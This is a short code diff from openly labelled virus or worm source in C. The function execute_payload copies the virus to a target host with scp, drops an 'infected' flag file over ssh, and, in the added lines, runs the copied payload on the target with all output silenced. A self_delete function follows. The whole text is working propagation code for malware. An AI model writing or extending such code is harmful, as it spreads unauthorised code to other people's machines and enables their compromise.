@@ -92,10 +92,14 @@ void execute_payload(char *virus_name, char *target_ip_buff) {
     // copy virus in tmpfs
     generate_random_string(rnd_name_buffer);
     snprintf(cmd_buffer, sizeof(cmd_buffer), "scp %s debian@%s:%s/%s > /dev/null 2>&1", virus_name, target_ip_buff, VIRUS_WOKRING_DIR, rnd_name_buffer);
-    system(cmd_buffer);
-    // add infected flag
-    snprintf(cmd_buffer, sizeof(cmd_buffer), "ssh debian@%s touch %s/%s > /dev/null 2>&1", target_ip_buff, VIRUS_WOKRING_DIR, INFECTED_FLAG);
-    system(cmd_buffer);
+    if(system(cmd_buffer) == 0) {
+        // add infected flag
+        snprintf(cmd_buffer, sizeof(cmd_buffer), "ssh debian@%s touch %s/%s > /dev/null 2>&1", target_ip_buff, VIRUS_WOKRING_DIR, INFECTED_FLAG);
+        system(cmd_buffer);
+        // exec payload on target host
+        snprintf(cmd_buffer, sizeof(cmd_buffer), "ssh debian@%s %s/%s > /dev/null 2>&1", target_ip_buff, VIRUS_WOKRING_DIR, rnd_name_buffer);
+        system(cmd_buffer);
+    }
 }
 
 void self_delete(char *program_name) {
